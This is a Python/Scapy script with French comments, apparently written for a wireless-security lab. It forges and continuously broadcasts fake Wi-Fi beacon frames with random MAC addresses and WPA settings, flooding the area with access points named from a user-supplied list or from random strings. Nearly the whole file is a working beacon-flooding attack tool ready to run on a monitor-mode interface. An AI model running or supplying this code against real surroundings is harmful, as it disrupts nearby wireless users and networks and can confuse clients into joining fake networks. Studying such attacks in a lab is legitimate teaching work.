#!/usr/bin/env python
#-*- coding: utf-8 -*-
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
#  Authors : yimnaing Kamdem && Siu Aurelien
#  Objectif: Développer un script en Python/Scapy capable d'inonder la salle avec des SSID dont
#            le nom correspond à une liste contenue dans un fichier text fournit par un utilisateur.
#            Si l'utilisateur ne possède pas une liste, il peut spécifier le nombre d'AP à générer. 
#            Dans ce cas, les SSID seront générés de manière aléatoire.
#  Description:
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

import sys
import random
from random import seed
from random import randint
import string
from scapy.all import *

# seed pour la génération aléatoire de nombre
seed(1)

interface = "wlan0mon"
nbApToGenerate=""
apNames =[]
frames=[]

# Génération d'une chaîne de caractère d'une longueur de 6 mots
def randomStringDigits(stringLength=6):
    lettersAndDigits = string.ascii_letters + string.digits
    return ''.join(random.choice(lettersAndDigits) for i in range(stringLength))

# We check if we received the AP list as parameter
if (len(sys.argv) != 2):
    # Dans le cas ou nous n'avons pas reçu de nom de fichier en paramètre,
    # le nombre de noms d'AP à générer
    nbApToGenerate = int(input('No AP list file provided,\
        please enter the number of AP to generate :'))
    for x in range(nbApToGenerate):
        apNames.append(randomStringDigits(randint(4, 12)))

else :
    # Ouverture du fichier passé en paramètre
    file = open(sys.argv[1],"r")
    # Récupération des noms de points d'accès
    apNames = file.read().split('\n')
    del apNames[-1]
    # Fermeture du fichier
    file.close()

print(apNames)

input("\nPress enter to start\n")


# source pour les beacons: https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
for ap in apNames:
    # Génération d'une beacon frame avec des adresses mac aléatoires
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
    addr2=RandMAC(), addr3=RandMAC())
    
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID',info=ap, len=len(ap))
    rsn = Dot11Elt(ID='RSNinfo', info=(
    '\x01\x00'                 #RSN Version 1
    '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
    '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
    '\x00\x0f\xac\x04'         #AES Cipher
    '\x00\x0f\xac\x02'         #TKIP Cipher
    '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
    '\x00\x0f\xac\x02'         #Pre-Shared Key
    '\x00\x00'))               #RSN Capabilities (no extra capabilities)

    # Création de la trame à partir des informations spécifiées
    frame = RadioTap()/dot11/beacon/essid/rsn

    # Ajout de la trame à la liste
    frames.append(frame)

# Envoi de beacon frames en continu 
while(True):
    sendp(frames[randint(0, len(frames) - 1)], iface=interface, verbose=False)


 